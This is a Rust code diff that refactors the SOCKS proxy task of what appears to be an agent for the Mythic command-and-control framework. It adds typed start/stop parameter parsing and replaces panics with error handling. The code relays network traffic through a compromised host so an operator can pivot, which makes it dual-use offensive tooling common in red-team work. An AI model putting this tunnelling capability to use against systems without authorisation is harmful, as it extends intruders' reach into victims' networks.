@@ -26,23 +26,37 @@ pub struct SocksMsg {
     data: String,
 }
 
+#[derive(Debug, Deserialize)]
+struct CmdParams {
+    action: CmdAction,
+    port: u16
+}
+#[derive(Debug, Deserialize)]
+#[serde(rename_all = "lowercase")]
+enum CmdAction {
+    Start,
+    Stop
+}
+
 pub fn task_socks(
     parameters: &str,
     uuid: String,
     socks_from_backend: &mut Option<Sender<SocksMsg>>,
     socks_to_backend: &mut Option<Receiver<SocksMsg>>,
 ) -> Result<Option<(Arc<AtomicBool>, mpsc::Sender<Value>, mpsc::Receiver<Value>)>, Box<dyn Error>> {
-    match parameters
+
+    let parameters: CmdParams = serde_json::from_str(parameters)?;
+    match parameters.action
     {
-        "start" => {
+        CmdAction::Start => {
+            // Create async channels to get and send messages between Agent and (Socks) Runtime
             let (snd_from_mythic,recv_from_mythic) = tokio::sync::mpsc::channel(1024);
             let (snd_to_mythic,recv_for_mythic) = tokio::sync::mpsc::channel(1024);
             *socks_from_backend = Some(snd_from_mythic);
             *socks_to_backend = Some(recv_for_mythic);
 
-            //
+            // Create a sync channel to report errors to Mythic
             let (tx, rx) = mpsc::channel();
-
 
             // Create a new flag indicating that the task is running
             let running = Arc::new(AtomicBool::new(true));
@@ -69,12 +83,11 @@ pub fn task_socks(
                     rx,
             )))
         },
-        "stop" => {
+        CmdAction::Stop => {
             *socks_from_backend = None;//Droping this will end the loop
             *socks_to_backend = None;
             Ok(None)
         }
-        p => Err(format!("parameter {}", p).into())
     }
 }
 
@@ -90,20 +103,14 @@ pub fn setup_socks(
     rt.block_on(async {
         let client_sockets: Arc<Mutex<HashMap<usize, Client>>> = Arc::new(Mutex::new(HashMap::new()));
         
-        // Notify Mythic that the portfwd has started
-        /*tx.send(mythic_continued!(
-            task.id,
-            "started socks",
-            ""
-        ))?;*/
-        // Loop continuously until the exit flag is set
+        // Loop continuously until the sender (from mythic) is droped
         loop {
             let msg = if let Some(msg) = recv_from_mythic.recv().await {
                 msg
             }else{
                 break;
             };
-            let data = base64::decode(msg.data).expect("socks not base64");
+            let data = base64::decode(msg.data)?;
             let id = msg.server_id;
 
             let op = if let Some(c) = client_sockets.lock().await.get_mut(&id){
@@ -128,7 +135,7 @@ pub fn setup_socks(
             if let Err(_e) = op {
                 //client error
                 client_sockets.lock().await.remove(&id);
-                write_mplx_data(id, true, &[0], &snd_to_mythic).await.unwrap();
+                write_mplx_data(id, true, &[0], &snd_to_mythic).await?;
             }
             if msg.exit {
                 if let Some(c) = client_sockets.lock().await.remove(&id){
@@ -195,12 +202,7 @@ async fn socks_dns(data: &[u8]) -> io::Result<SocketAddr> {
         "no valid name"
         ));}
 
-    let portb : [u8;2] = data[len+1..].try_into().unwrap();
-
-    /*
-    println!("connect dns {:?}", //String::from_utf8_lossy(&data[..data.len()-2])
-        std::str::from_utf8(&data[1..len+1])
-    );*/
+    let portb : [u8;2] = data[len+1..].try_into().unwrap(); //safe: len checked
 
     (
         std::str::from_utf8(&data[1..len+1]).map_err(|_|{
@@ -215,8 +217,8 @@ async fn socks_ipv6(data: &[u8]) -> io::Result<SocketAddr> {
         "no IPv6"
         ));}
     
-        let ipb : [u8;16] = data[0..16].try_into().unwrap();
-        let portb : [u8;2] = data[16..18].try_into().unwrap();
+        let ipb : [u8;16] = data[0..16].try_into().unwrap(); //safe: len checked
+        let portb : [u8;2] = data[16..18].try_into().unwrap(); //safe: len checked
 
         Ok(SocketAddr::new(IpAddr::V6(
             Ipv6Addr::from(ipb)),
@@ -229,8 +231,8 @@ async fn socks_ipv4(data: &[u8]) -> io::Result<SocketAddr> {
     "no IPv4"
     ));}
 
-    let ipb : [u8;4] = data[0..4].try_into().unwrap();
-    let portb : [u8;2] = data[4..6].try_into().unwrap();
+    let ipb : [u8;4] = data[0..4].try_into().unwrap(); //safe: len checked
+    let portb : [u8;2] = data[4..6].try_into().unwrap(); //safe: len checked
 
     Ok(SocketAddr::new(IpAddr::V4(
         Ipv4Addr::from(ipb)),
